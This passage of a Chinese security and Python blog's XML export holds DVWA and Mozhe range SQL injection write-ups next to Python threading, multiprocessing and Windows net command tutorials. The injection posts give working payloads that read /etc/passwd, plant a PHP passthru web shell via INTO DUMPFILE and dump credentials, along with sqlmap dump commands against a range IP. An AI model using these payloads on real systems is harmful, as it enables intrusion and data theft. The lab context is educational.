$id"; # id值没有引号闭合 $result = mysql_query($getid) or die('&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' ); $num = mysql_numrows($result); $i=0; while ($i &lt; $num) &#123; $first = mysql_result($result,$i,"first_name"); $last = mysql_result($result,$i,"last_name"); echo '&lt;pre&gt;'; echo 'ID: ' . $id . '&lt;br&gt;First name: ' . $first . '&lt;br&gt;Surname: ' . $last; echo '&lt;/pre&gt;'; $i++; &#125;&#125;?&gt; id值被mysql_real_escape_string()函数进行一些字符的转移，但是仔细观察，后面的SQL语句中id值并没有引号闭合，故此过滤函数为多余的 mysql_real_escape_string() 【php5.5.0已经弃用该函数，PHP 7.0.0已经删除该函数，使用MySQLi、PDO_MySQL代替】转义的字符： \x00 \n \r \ ‘ “ \x1a High123456789101112131415161718192021222324252627282930313233&lt;?php if (isset($_GET['Submit'])) &#123; // Retrieve data $id = $_GET['id']; $id = stripslashes($id); # 去掉'\' $id = mysql_real_escape_string($id); # 对一些字符进行转义 if (is_numeric($id))&#123; # 判断id值是否为数字 $getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id'"; $result = mysql_query($getid) or die('&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' ); $num = mysql_numrows($result); $i=0; while ($i &lt; $num) &#123; $first = mysql_result($result,$i,"first_name"); $last = mysql_result($result,$i,"last_name"); echo '&lt;pre&gt;'; echo 'ID: ' . $id . '&lt;br&gt;First name: ' . $first . '&lt;br&gt;Surname: ' . $last; echo '&lt;/pre&gt;'; $i++; &#125; &#125;&#125;?&gt; 不仅对字符进行了过滤，还加了数字的判断，目前未发现可绕过的方法]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>Web渗透</tag>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[墨者-SQL注入漏洞测试(布尔盲注)]]></title>
    <url>%2F2019%2F07%2F23%2F%E5%A2%A8%E8%80%85-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%2F</url>
    <content type="text"><![CDATA[Background 一位热心的网友再次向“墨者”安全工程师挑战，“墨者”工程师在注入时发现网页无回显，“墨者”工程师想了一会就注入完成拿到了key。 靶场页面 发现注入点在登陆页面的 “维护停机” 存在注入点 查询数据库利用sqlmap查询当前该站点的数据库 1sqlmap.py -u "http://219.153.49.228:47719/new_list.php?id=1" --current-db 获得数据库名称 stormgroup 查询表名1sqlmap.py -u "http://219.153.49.228:47719/new_list.php?id=1" -D stormgroup --tables 获得表名 member、 notice 查询列名1sqlmap.py -u "http://219.153.49.228:47719/new_list.php?id=1" -D stormgroup -T member --columns 获得列名字段 name、 password、 status 查询用户名密码1sqlmap.py -u "http://219.153.49.228:47719/new_list.php?id=1" -D stormgroup -T member -C name,password --dump 密码为MD5加密，在线破解be92492fa64d6126726a71584a75a878 登陆后台用解密后的用户名和密码登陆后台获取key值]]></content>
      <categories>
        <category>靶场实战</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>SQL注入</tag>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python-多线程threading]]></title>
    <url>%2F2019%2F07%2F21%2FPython-%E5%A4%9A%E7%BA%BF%E7%A8%8Bthreading%2F</url>
    <content type="text"><![CDATA[Python多线程&emsp;&emsp;线程（thread）是操作系统能够进行运算调度的最小单位。它被包含在进程之中，是进程中的实际运作单位。一条线程指的是进程中一个单一顺序的控制流，一个进程中可以并发多个线程，每条线程并行执行不同的任务。 进程是资源分配的最小单位，线程是CPU调度的最小单位，每一个进程中至少有一个线程。 线程的特点&emsp;&emsp;在多线程OS中，通常是在一个进程中包括多个线程，每个线程都是作为利用CPU的基本单位，是花费最小开销的实体。 轻型实体；&emsp;&emsp;线程中的实体基本上不拥有系统资源，只是有一点必不可少的、能保证独立运行的资源。&emsp;&emsp;线程的实体包括程序、数据和TCB。线程是动态概念，它的动态特性由线程控制块TCB（Thread Control Block）描述。 独立调度和分派的基本单位；&emsp;&emsp;在多线程OS中，线程是能独立运行的基本单位，因而也是独立调度和分派的基本单位。由于线程很“轻”，故线程的切换非常迅速且开销小（在同一进程中的）。 可并发执行；&emsp;&emsp;在一个进程中的多个线程之间，可以并发执行，甚至允许在一个进程中所有线程都能并发执行；同样，不同进程中的线程也能并发执行，充分利用和发挥了处理机与外围设备并行工作的能力。 共享进程资源；&emsp;&emsp;在同一进程中的各个线程，都可以共享该进程所拥有的资源，这首先表现在：所有线程都具有相同的地址空间（进程的地址空间），这意味着，线程可以访问该地址空间的每一个虚地址；此外，还可以访问进程所拥有的已打开文件、定时器、信号量机构等。由于同一个进程内的线程共享内存和文件，所以线程之间互相通信不必调用内核。 创建线程python的thread模块是比较底层的模块，python的threading模块是对thread做了一些包装的，可以更加方便的被使用 1class threading.Thread(group=None, target=None, name=None, args=(), kwargs=&#123;&#125;, *, daemon=None) 参数： group：目前此参数为None，在实现ThreadGroup类时为将来的扩展保留。 target：target接收的是一个函数的地址，由run()方法调用执行函数中的内容。默认为无，表示未调用任何内容。 name ：线程名，可自行定义。 args：target接收的是函数名，此函数的位置参数以元组的形式存放在args中，用于执行函数时调用。 kwargs ：target接收的是函数名，此函数的关键字参数以字典的形式存放在kwargs中，用于执行函数时调用。 daemon：如果为True表示该线程为守护线程。方法： threading模块的方法： threading.currentThread(): 返回当前的线程变量。 threading.enumerate(): 返回一个包含正在运行的线程的list。正在运行指线程启动后、结束前，不包括启动前和终止后的线程。 threading.activeCount(): 返回正在运行的线程数量，与len(threading.enumerate())有相同的结果。 Thread类方法： start()：开启线程，一个Thread对象只能调用一次start()方法，如果在同一线程对象上多次调用此方法，则会引发RuntimeError。 run()：执行start()方法会调用run()，该方将创建Thread对象时传递给target的函数名，和传递给args、kwargs的参数组合成一个完整的函数，并执行该函数。run()方法一般在自定义Thead类时会用到。 join(timeout=None)：join会阻塞、等待线程，timeout单位为秒，因为join（）总是返回none，所以在设置timeout调用join（timeout）之后，需要使用isalive（）判断线程是否执行完成，如果isalive为True表示线程在规定时间内没有执行完，线程超时。如果join(timeout=None)则会等待线程执行完毕后才会执行join（）后面的代码，一般用于等待线程结束。 name：获取线程名。 getName()：获取线程名。 setName(name)：设置线程名。 ident：“线程标识符”，如果线程尚未启动，则为None。如果线程启动是一个非零整数。 is_alive()：判断线程的存活状态，在run（）方法开始之前，直到run（）方法终止之后。如果线程存活返回True，否则返回False。 daemon：如果thread.daemon=True表示该线程为守护线程，必须在调用Start（）之前设置此项，否则将引发RuntimeError。默认为False isDaemon()：判断一个线程是否是守护线程。 setDaemon(daemonic)：设置线程为守护线程。 thread创建线程123456789101112import threadingimport timeimport osdef test(num): print("线程--- %d" % num) time.sleep(2)if __name__ == '__main__': for i in range(5): t = threading.Thread(target=test,args=(i,)) t.start() 执行结果： 12345线程--- 0线程--- 1线程--- 2线程--- 3线程--- 4 thread子类创建线程1234567891011121314import threadingimport timeclass MyThread(threading.Thread): # 重写run方法 def run(self): for i in range(3): time.sleep(1) print(self.name + "\t" + str(i))if __name__ == '__main__': for i in range(5): # 创建5个线程 t = MyThread() t.start() 执行结果： 123456789101112131415Thread-1 0Thread-2 0Thread-3 0Thread-5 0Thread-4 0Thread-2 1Thread-1 1Thread-3 1Thread-5 1Thread-4 1Thread-2 2Thread-1 2Thread-4 2Thread-3 2Thread-5 2 共享全局变量利用线程对变量num分别加1000000次： 1234567891011121314151617181920212223from threading import Threadimport time# 定义一个全局变量num = 0def test1(): global num for i in range(1000000): num += 1 print("当前值--num:%d"%num)def test2(): global num for i in range(1000000): num += 1 print("当前值--num:%d"%num)if __name__ == '__main__': t1 = Thread(target=test1) # 线程1 t2 = Thread(target=test2) # 线程2 t1.start() # time.sleep(2) # 可通过延时保证test1执行完毕 t2.start() 执行结果： 12当前值--num:1196015当前值--num:1458177 # 执行结果不为2000000，且每次结果不一样 python之间线程是可以共享同一进程中的所有资源，包括变量。但为什么上述代码执行结果不是2000000，这和操作系统的cpu处理速度和调度算法有关，“ num += 1 ” 可以看成 “ num = num + 1 ”，分为两部，先加法，再赋值；例如当num=1000，线程1的num加法执行完，要进行赋值“num = 1001”时，cpu切换了线程，执行线程2，执行了一个时间片后，再回到线程1，尽管这时num的值叠加了好几轮，执行了“num = 1001”，num的值就又回到原点了；同时执行两个线程没有达到预期效果。总结： 在一个进程内的所有线程共享全局变量，能够在不适用其他方式的前提下完成多线程之间的数据共享 缺点就是，线程是对全局变量随意遂改可能造成多线程之间对全局变量的混乱（即线程非安全） 互斥锁当多个线程几乎同时修改某一个共享数据的时候，需要进行同步控制线程同步能够保证多个线程安全访问竞争资源，最简单的同步机制是引入互斥锁。 线程同步：即当有一个线程在对内存进行操作时，其他线程都不可以对这个内存地址进行操作，直到该线程完成操作， 其他线程才能对该内存地址进行操作，而其他线程又处于等待状态，实现线程同步的方法有很多，临界区对象就是其中一种。 互斥锁为资源引入一个状态：锁定/非锁定。 某个线程要更改共享数据时，先将其锁定，此时资源的状态为“锁定”，其他线程不能更改；直到该线程释放资源，将资源的状态变成“非锁定”，其他的线程才能再次锁定该资源。互斥锁保证了每次只有一个线程进行写入操作，从而保证了多线程情况下数据的正确性。 threading模块中定义了Lock类，可以方便的处理锁定： 123456#创建锁mutex = threading.Lock()#锁定mutex.acquire([blocking])#释放mutex.release() 其中，锁定方法acquire可以有一个blocking参数。 如果设定blocking为True，则当前线程会堵塞，直到获取到这个锁为止（如果没有指定，那么默认为True） 如果设定blocking为False，则当前线程不会堵塞 使用互斥锁实现上面的例子的代码如下： 123456789101112131415161718192021222324252627282930from threading import Thread, Lock# 定义一个全局变量num = 0# 创建锁,默认没有上锁mutex = Lock()def test1(): global num # 上锁 mutex.acquire() # 如果有一方上锁，则另一方则会进入堵塞状态 for i in range(1000000): num += 1 # 解锁 mutex.release() print("当前值--num:%d"%num)def test2(): global num mutex.acquire() for i in range(1000000): num += 1 mutex.release() print("当前值--num:%d"%num)if __name__ == '__main__': t1 = Thread(target=test1) # 线程1 t2 = Thread(target=test2) # 线程2 t1.start() t2.start() 执行结果： 12当前值--num:1000000当前值--num:2000000 死锁在线程间共享多个资源的时候，如果两个线程分别占有一部分资源并且同时等待对方的资源，就会造成死锁。 尽管死锁很少发生，但一旦发生就会造成应用的停止响应。下面看一个死锁的例子 1234567891011121314151617181920212223242526272829303132333435363738394041import threadingimport timemutexA = threading.Lock()mutexB = threading.Lock()class Thread1(threading.Thread): # 重写run方法 def run(self): if mutexA.acquire(): # mutexA上锁 print(self.name + "-------acquire mutexA") time.sleep(1) # 保证mutexA、mutexB都堵塞 if mutexB.acquire(): # 等待Thread2释放mutexB print(self.name + "-------acquire mutexB") mutexB.release() print(self.name + "-------release mutexB") mutexA.release() print(self.name + "-------release mutexA")class Thread2(threading.Thread): # 重写run方法 def run(self): if mutexB.acquire(): # mutexB上锁 print(self.name + "-------acquire mutexB") time.sleep(1) if mutexA.acquire(): # 等待Thread1释放mutexA print(self.name + "-------acquire mutexA") mutexA.release() print(self.name + "-------release mutexA") mutexB.release() print(self.name + "-------release mutexB")if __name__ == '__main__': t1 = Thread1() t2 = Thread2() t1.start() t2.start() 注：time.sleep(1)的作用是保证两个线程都抢占到资源；由于代码比较少，cpu运行速度快，延时的作用防止线程1直接执行完，而看不到结果线程1和线程2各自等待对方资源释放，这样就陷入死锁了。执行结果： 123Thread-1-------acquire mutexAThread-2-------acquire mutexB （...死锁） 避免死锁的方法 增加超时时间 银行家算法 百度百科参考博客]]></content>
      <categories>
        <category>python系统编程</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[手动挖掘漏洞-SQL注入（二）]]></title>
    <url>%2F2019%2F07%2F19%2F%E6%89%8B%E5%8A%A8%E6%8C%96%E6%8E%98%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E4%BA%8C%EF%BC%89%2F</url>
    <content type="text"><![CDATA[通过SQL注入读取文件、写入文件、保存下载数据库(拖库) 读取文件这里以读取系统本地账号密码为例 1' union select null, load_file('/etc/passwd') -- 写入文件工具burpsuite 往服务器端插入php一句话木马，INTO DUMPFILE：MySQL函数，将输入保存成文件下载至本地（服务器） 1' union select null,"&lt;?php passthru($_GET['cmd']); ?&gt;" INTO DUMPFILE "/var/www/a.php" -- 很可惜，无法写入，原因是没有权限，现有的只有mysql的权限一般来说，不同的服务都有其特定的用户账号，而账号都有其一定权限，而这些权限仅局限于自己服务的主目录下，没有权限向其他目录读些东西，这里的/var/www/目录的权限是： 12msfadmin@metasploitable:/var/www$ ls -lddrwxr-xr-x 10 www-data www-data 4096 2012-05-20 15:31 . 所以这里我选择写入默认路径， 1' union select null,"&lt;?php passthru($_GET['cmd']); ?&gt;" INTO DUMPFILE "a.php" -- 但是写入后，我们且会因没有权限而无法利用上传的脚本 当无权限进行指定目录写入文件时，可使用文件包含漏洞 这里我们可以把脚本到/temp目录，这个目录是linux的通用目录，可以读写，虽然还是没有执行权限 1' union select null,"&lt;?php passthru($_GET['cmd']); ?&gt;" INTO DUMPFILE "/tmp/a.php" -- 写入之后，配合文件包含漏洞，命令执行 也可以上传一些shell脚本 选择反弹连接的shell，修改里面参数 因为服务器一般会有过滤机制，所以可以对shell进行编码再上传 1root@kali:/test# cat shell.php | xxd -ps | tr -d &quot;\n&quot; xxd -ps： 编码成16进制tr -d “\n”： 删除换行符 保存下载数【拖库】1' union select null, concat(user,0x3a,password) from users INTO OUTFILE '/tmp/a.db'--]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>Web渗透</tag>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python多进程拷贝文件]]></title>
    <url>%2F2019%2F07%2F18%2Fpython%E5%A4%9A%E8%BF%9B%E7%A8%8B%E6%8B%B7%E8%B4%9D%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[Python多进程拷贝实现思路 创建可获取目标文件或文件夹中的所有文件夹和文件的列表的函数 创建拷贝文件的函数 主函数创建进程池和消息队列 获取文件夹和文件列表先判断路径是文件还是文件夹，是文件直接添加至文件列表；文件夹的话，添加至文件夹列表，利用os.listdir()函数列出当前文件夹内的所有文件，循环遍历，拼接源地址，然后作为参数递归循环； 12345678910111213def get_file_list(source_path): """ 遍历该文件夹中的所有文件和文件夹 获取源文件夹中的文件夹、文件列表 """ if os.path.isdir(source_path): S_Dir_List.append(source_path) for temp in os.listdir(source_path): # 拼接源地址+文件名，变成新地址，再进行递归 new_source_path = os.path.join(source_path, temp) get_file_list(new_source_path) else: S_File_List.append(source_path) 拷贝文件传入的参数 queue： 消息队列，用于主函数计数 source_file： 源文件路径 dest_file： 目标文件的路径 循环读取写入，是防止文件过大，读写卡死 12345678910111213141516171819def copy_file(queue, source_file, dest_file): """ 复制文件从源文件 """ try: fr = open(source_file,"rb") fw = open(dest_file,"wb") except Exception as e: print("error:" + str(e)) else: while True: content = fr.read(4096) if not content: break fw.write(content) fr.close() fw.close() # 将文件名传入队列消息，代表复制完成 queue.put(source_file) 源代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586from multiprocessing import Manager, Poolimport osimport time# 源文件列表 文件夹列表S_File_List = []S_Dir_List = []def get_file_list(source_path): """ 遍历该文件夹中的所有文件和文件夹 获取源文件夹中的文件夹、文件列表 """ if os.path.isdir(source_path): S_Dir_List.append(source_path) for temp in os.listdir(source_path): # 拼接源地址+文件名，变成新地址，再进行递归 new_source_path = os.path.join(source_path, temp) get_file_list(new_source_path) else: S_File_List.append(source_path)def copy_file(queue, source_file, dest_file): """ 复制文件从源文件 """ try: fr = open(source_file,"rb") fw = open(dest_file,"wb") except Exception as e: print("error:" + str(e)) else: while True: content = fr.read(4096) if not content: break fw.write(content) fr.close() fw.close() # 将文件名传入队列消息，代表复制完成 queue.put(source_file)def main(): # 获取源文件夹中的所有文件和文件夹 source_path = input("请输入要拷贝的源文件路径：") get_file_list(source_path) # 创建目标文件夹 dest_path = source_path + "-[复件]" for sour_dir in S_Dir_List: # 替换文件的路径 dest_dir = sour_dir.replace(source_path, dest_path) try: os.mkdir(dest_dir) except Exception as e: print("error" + str(e)) # 创建进程池 pool = Pool(5) queue = Manager().Queue() # 创建队列消息用来计数 for sour_file in S_File_List: # 替换文件的路径 dest_file = sour_file.replace(source_path,dest_path) # print(dest_file) # 往进程池添加任务 pool.apply_async(copy_file, args=(queue, sour_file, dest_file)) pool.close() # 关闭进程池 pool.join() # 等待子进程结束 # 显示复制文件的进度 filesNums = len(S_File_List) COUNT = 0 while True: queue.get() COUNT += 1 Rate = COUNT/filesNums print("\r当前进度： %.2f%%"%(Rate*100), end='') if Rate &gt;= 1: break print("\n...Done")if __name__ == '__main__': main()]]></content>
      <categories>
        <category>python系统编程</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常见的DOS命令]]></title>
    <url>%2F2019%2F07%2F16%2F%E5%B8%B8%E8%A7%81%E7%9A%84DOS%E5%91%BD%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[介绍常用的dos命令 1.Net命令在Dos命令提示符下输入 “net” 、 “net /?” 或 “net help”，可以获得帮助信息。1234NET [ ACCOUNTS | COMPUTER | CONFIG | CONTINUE | FILE | GROUP | HELP | HELPMSG | LOCALGROUP | PAUSE | SESSION | SHARE | START | STATISTICS | STOP | TIME | USE | USER | VIEW ] net view 作用：显示域列表、计算机列表或指定计算机的共享资源列表。 1命令格式：Net view [\\computername | /domain[:domainname]] 参数： 不带参数的 “net view” ，显示当前域的计算机列表 “\computername” ，指定要查看其共享资源的计算机 “/domain[:domainname]” ，指定要查看其可用计算机的域如：12Net view \\ABC #查看ABC计算机的共享资源列表Net view /domain:XYZ #查看XYZ域中的机器列表。 net user 作用：添加或更改用户帐号或显示用户帐号信息。 1命令格式：Net user [username [password | *] [options]] [/domain] 参数： 不带参数的“Net user” ，查看计算机上的用户帐号列表 “username” 用于添加、删除更改或查看用户的账号名 “password” 用于为用户账号分配或更改密码 “*” 提示输入密码 “/domain” 在计算机主域的主域控制器中执行操作 “net user” 命令一般配合 “net loaclgroup”命令使用，用于添加用户，以及提升yoghurt到管理员组中。 123命令格式：net loaclgroup [groupname [/COMMENT:&quot;text&quot;]] [/DOMAIN] groupname &#123;/ADD [/COMMENT:&quot;text&quot;] | /DELETE&#125; [/DOMAIN] groupname name [...] &#123;/ADD | /DELETE&#125; [/DOMAIN] 参数： 不带参数的 “net localgroup” 命令，可显示服务器和计算机的本地组名称 “groupname” 表示添加、扩充或删除的本地组名称 “/COMMENT:”text”” 表示为新建或现有的组添加注释 “/DOMAIN” 表示在当前域的主域控制器中执行操作，否则仅在本地计算机上执行操作 “name […]” 列出要添加到本地组或从本地组删除的一个或多个用户名或组名 “/add” 用于将全局组名或用户名添加到本地组中 “/delete” 用于从本地组中删除组名或用户名如，将用户名“test”, 密码“12345678” 的用户添加至管理员组中 1234net user # 查看用户net user test 12345678 /add # 添加用户net localgroup Administrators test /add # 添加至管理员组net localgroup Administrators # 查看管理员组 net use 作用：用于查看连接的计算机，断开计算机与共享资源的连接，或者显示计算机的连接信息 1234567891011命令格式：NET USE[devicename | *] [\\computername\sharename[\volume] [password | *]] [/USER:[domainname\]username] [/USER:[dotted domain name\]username] [/USER:[username@dotted domain name] [/SMARTCARD] [/SAVECRED] [/REQUIREINTEGRITY] [/REQUIREPRIVACY] [[/DELETE] | [/PERSISTENT:&#123;YES | NO&#125;]] 参数： 输入不带参数 “net use” 命令，可列出网络连接 “devicename” 用于指定要连接的资源名称或要断开的设备名称 “\\computername\sharename” 表示服务器及共享资源的名称 “password” 表示访问共享资源的密码 “*” 提示输入密码 “/user” 用于指定进行连接的另外一个用户 “domainname” 用于指定另一个域 “username” 用于指定登陆的用户名 “/home” 用于将用户连接到其宿主主目录 “/delete” 用于取消指定的网络连接 “/persistent” 用于控制永久网络连接的使用 net time 作用：用于查看系统时间，或用于同步其他计算机域的时钟 123命令格式：NET TIME[\\computername | /DOMAIN[:domainname] | /RTSDOMAIN[:domainname]] [/SET] 参数： “computename” 表示要检查或同步的服务器名 “/DOMAIN[:domainname]” 用于指定要与其时间同步的域 “/set” 用于使本计算机时钟与指定计算机或域的时钟同步 net statisics 作用：用于显示本地工作站的统计记录 123命令格式：NET STATISTICS[WORKSTATION] net share 作用：用于创建、删除或显示共享资源 123456789101112命令格式：NET SHAREsharename sharename=drive:path [/GRANT:user,[READ | CHANGE | FULL]] [/USERS:number | /UNLIMITED] [/REMARK:&quot;text&quot;] [/CACHE:Manual | Documents| Programs | BranchCache | None] sharename [/USERS:number | /UNLIMITED] [/REMARK:&quot;text&quot;] [/CACHE:Manual | Documents | Programs | BranchCache | None] &#123;sharename | devicename | drive:path&#125; /DELETE sharename \\computername /DELETE 参数： 不带参数 “net share” 表示共享资源的绝对路径 “sharename” 表示共享资源的网络名称 “drive:path” 用于指定共享目录的绝对路径 “/users:number” 用于设置可同时访问共享资源的最大用户数 “unlimited” 表示不限制同时访问共享资源的最大用户数 “/remark:”text”” 用于添加关于资源的注释，注释文字用引号包裹### net share 作用：用于创建、删除或显示共享资源 net session 作用：用于列出或断开本地计算机和与之连接的客户端的会话，也可以写成“net sessions”或“net sess” 123命令格式：NET SESSION[\\computername] [/DELETE] [/LIST] 参数： 不带参数 “net session” 显示所有与本地计算机的会话信息 “computername” 用于标识要列出或断开会话的计算机 “/delete” 用于结束与“computername”计算机的会话，并关闭本次会话期间计算机的所有进程 Ipconfig“ipconfig”和“ipconfig /all” 用于查看网络的配置情况。]]></content>
      <categories>
        <category>windows基础</category>
      </categories>
      <tags>
        <tag>windows</tag>
        <tag>dos命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[手动挖掘漏洞---SQL注入（一）]]></title>
    <url>%2F2019%2F07%2F15%2F%E6%89%8B%E5%8A%A8%E6%8C%96%E6%8E%98%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
    <content type="text"><![CDATA[SQL注入 所谓SQL注入，就是通过使用POST或GET方式把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意的）SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。 程序存在SQL注入，追其原因，就是代码或编码的不完善 如常见的用户登陆，举个简单的例子： 1SELECT * FROM users WHERE user='uname' AND password='pass' 一般情况下，通过布尔判断，只要SQL语句为真，即为登陆成功。这句SQL语句意思是查询users表中是否存在用户名为uname，密码为pass的用户，语句为真即登陆成功，语句为假即登陆失败。 若在不知道用户名和密码的情况下，我们可以将【pass】替换为【’ or 1=1 – 】 1SELECT * FROM users WHERE user='uname' AND password='' or 1=1 -- ' 注:【– 】 可以用来注释掉后边的语句。根据布尔判断，这句话就可以成真了，登陆成功 一些简单判断是否存在SQL注入的方法： 基于报错的检测方法(low) ‘ “ % ( ) 基于布尔的检测 1’ and ‘1’=’1 &emsp;或&emsp; 1’ and ‘1 1’ and ‘1’=’2 &emsp;或&emsp; 1’ and ‘0 表列数/显示信息位于哪一列 ‘ order by 9–+ #按查询列号 （如select * from table order by n 表示select里面的第n个字段） select * 时表字段数=查询字段数 联合查询 ‘ union select 1,2–+ ‘ union all select database(),2–+（联合查询前后语句的查询字段数要相等） 下面用metasploitable中的dvwa(low)进行演示这个提交表单作用是根据用户输入id ，返回用户的first_name、subname； 当我们不根据规则，输入一些不规范的数据，如“’”网页报错了，并返回了信息，可以判断是MySQL的数据库，错误原因是引号无法闭合。也可以利用布尔值判断当输入1’ and ‘1’=’1 ，语句为真，程序执行 ；1’ and ‘1’=’2 ，语句为假，程序不执行； 基于这些判断，就可以认为存在SQL注入现在可以猜解select中的字段个数，利用“order by”语句 可以从1开始（注意空格）当数值到3时，网页报错 “Unknown column ‘3’ in ‘order clause’”说明，查询的字段个数为2； 然后我们可以利用联合查询语句，查询一些有用的信息因为union查询前后查询字段个数要相等，这里用1，2代替，1，2也可以替换成一些函数 ‘ union select database(),substring_index(user(),”@”,1) – （字符串截取substring_index(str, “分隔符”，计数)）利用hackbar构造语句提交 常用可SQL查询内容： DB用户：user() DB版本：version() 全局函数：@@datadir、@@hostname、@@VERSION、@@version_compile_os 当前库： database() ASCII转字符：char() 连接字符串：CONCAT_WS(CHAR(32,58,32),user(),database(),version()) 计算哈希：md5() Mysql 数据结构 information_schema 使用连接字符串函数查询（ascii码中，32为空格，58为冒号：） Mysql数据结构 对表的meta data的查询需要使用information_schema.tables， table_schema是数据库的名称，table_name是具体的表名，table_type指的是表的类型MySQL：所有的元数据都保存在一张元数据表【information_schema】 查看所有库所有表/统计库中表的数量1' union select table_name,table_schema from information_schema.tables -- 查询所有数据库中的所有表 1' union select table_schema,count(*) from information_schema.tables group by table_schema -- 统计每个数据库中的表数量 Dvwa库中的表名1' union select table_schema,table_name from information_schema.tables where table_schema='dvwa' -- 查询dvwa库的表 查询列名字段1' union select table_name,column_name from information_schema.columns where table_schema="dvwa" and table_name="users" -- 查询users表中的列名字段 查询表中数据1' union select user,password from dvwa.users -- 查询users表中的用户名、密码 到这里，用户名和密码都知道了，但是密码是加密过的，我们可以通过在线或离线的破解可以利用一些工具对密码使用的加密方式进行判断 1root@kali:/# hash-identifier 判断出来是md5哈希加密这里用离线破解的方式先将用户名密码保存至文件夹，格式如下用john进行破解 1root@kali:/# john --format=raw-MD5 dvwa.txt 如果出现以下错误，说明命令已经执行过了 123Using default input encoding: UTF-8Loaded 5 password hashes with no different salts (Raw-MD5 [MD5 128/128 SSE2 4x3])No password hashes left to crack (see FAQ) 命令执行后，会在“~”家目录里生成.john/的文件夹，里面有日志和破解后的明文文件要再执行，删除这两个文件即可]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>Web渗透</tag>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[进程池Pool & 进程间通信Queue]]></title>
    <url>%2F2019%2F07%2F12%2F%E8%BF%9B%E7%A8%8B%E6%B1%A0Pool-%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1Queue%2F</url>
    <content type="text"><![CDATA[进程池Pool当需要创建的子进程数量不多时，可以直接利用multiprocessing中的Process动态成生多个进程，但如果是上百甚至上千个目标，手动的去创建进程的工作量巨大，此时就可以用到multiprocessing模块提供的Pool方法。 初始化Pool时，可以指定一个最大进程数，当有新的请求提交到Pool中时，如果池还没有满，那么就会创建一个新的进程用来执行该请求；但如果池中的进程数已经达到指定的最大值，那么该请求就会等待，直到池中有进程结束，才会用之前的进程来执行新的任务，请看下面的实例： 1234567891011121314151617181920212223242526from multiprocessing import Poolimport osimport randomimport timedef worker(num): # for i in range(5): # print('---进程号: %d ---num=%d----'%(os.getpid(), num)) # time.sleep(1) print('---进程号: %d ---num=%d----'%(os.getpid(), num)) time.sleep(2)if __name__ == '__main__': pool = Pool(3) # 创建进程池， 进程数=3 for i in range(10): print("----添加任务：%d-----"%i) pool.apply_async(worker, (i,)) # 非堵塞式添加 # pool.apply(worker, (i,)) # 堵塞式添加 # 向进程池中添加任务数=10， 若添加的函数有参数，以元组的方式传入 pool.close() # 关闭进程池，不再添加新任务 pool.join() # 等待子进程都结束，主进程再结束 # 不然 主进程会在添加完任务后就结束 执行结果: 1234567891011121314151617181920----添加任务：0---------添加任务：1---------添加任务：2---------添加任务：3---------添加任务：4---------添加任务：5---------添加任务：6---------添加任务：7---------添加任务：8---------添加任务：9--------进程号: 13608 ---num=0-------进程号: 17324 ---num=1-------进程号: 2716 ---num=2-------进程号: 13608 ---num=3-------进程号: 17324 ---num=4-------进程号: 2716 ---num=5-------进程号: 13608 ---num=6-------进程号: 17324 ---num=7-------进程号: 2716 ---num=8-------进程号: 13608 ---num=9---- 非堵塞式添加和堵塞式添加阻塞与非阻塞指的是程序的两种运行状态 阻塞：遇到IO就发生阻塞，程序一旦遇到阻塞操作就会停在原地，并且立刻释放CPU资源 非阻塞（就绪态或运行态）：没有遇到IO操作，或者通过某种手段让程序即便是遇到IO操作也不会停在原地，执行其他操作，力求尽可能多的占有CPU pool.apply 和 pool.apply_async 的区别 apply ：阻塞式，需要等待当前子进程执行完毕后，在执行下一个子进程，耗时长。 apply_async ： 非阻塞式，async是异步的意思，不用等待当前运行的子进程执行完毕，随时根据系统调度来进行进程切换，耗时短。 进程间通信QueueProcess之间有时需要通信，操作系统提供了很多机制来实现进程间的通信。multiprocessing模块的Queue实现多进程之间的数据传递，Queue本身是一个消息列队程序 Queue的使用在内存中开辟一个队列模型，用来存放消息，任何拥有队列对象的进程都可以进行消息存放和取出 初始化Queue()对象时（例如：q=Queue()），若括号中没有指定最大可接收的消息数量，或数量为负值，那么就代表可接受的消息数量没有上限（直到内存的尽头）； Queue.qsize()：返回当前队列包含的消息数量； Queue.empty()：如果队列为空，返回True，反之False ； Queue.full()：如果队列满了，返回True,反之False； Queue.get([block[,timeout]]):获取队列中的一条消息，然后将其从列队中移除，block默认值为True； 1)如果block使用默认值，且没有设置timeout（单位秒），消息列队如果为空，此时程序将被阻塞（停在读取状态），直到从消息列队读到消息为止，如果设置了timeout，则会等待timeout秒，若还没读取到任何消息，则抛出”Queue.Empty”异常； （如 